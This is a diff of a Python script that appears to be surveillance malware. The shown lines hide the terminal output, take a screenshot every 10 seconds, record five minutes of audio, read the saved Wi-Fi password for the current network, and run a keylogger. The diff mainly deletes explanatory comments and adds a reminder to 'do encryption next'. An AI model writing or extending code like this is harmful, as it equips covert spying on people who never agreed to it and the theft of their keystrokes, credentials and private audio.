@@ -93,7 +93,6 @@ def get_current_wifi_ssid():
         logging.info("Failed to get current Wi-Fi network.")
         return None
 
-# Retrieve and save the Wi-Fi password for the current SSID
 def get_wifi_password(ssid):
     account = ssid_to_account.get(ssid)
     if account:
@@ -113,17 +112,14 @@ def get_wifi_password(ssid):
         logging.info(f"Unexpected error: {e}")
 
 if __name__ == "__main__":
-    # Suppress terminal output for stdout and stderr
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.devnull, 'w')
 
-    # Start the periodic screenshot thread
     screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)
     screenshot_thread.start()
 
-    # Set audio recording parameters and start recording thread
     audio_filename = os.path.join(log_dir, "audio_rec.wav")
-    recording_duration = 300  # Record for 5 minutes
+    recording_duration = 300  
     audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
     audio_thread.start()
 
@@ -134,9 +130,9 @@ if __name__ == "__main__":
     else:
         logging.info("No connected Wi-Fi network found.")
 
-    # Start the keylogger
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
 
-    # Keep the script running
     listener.join()
+
+# do encryption next
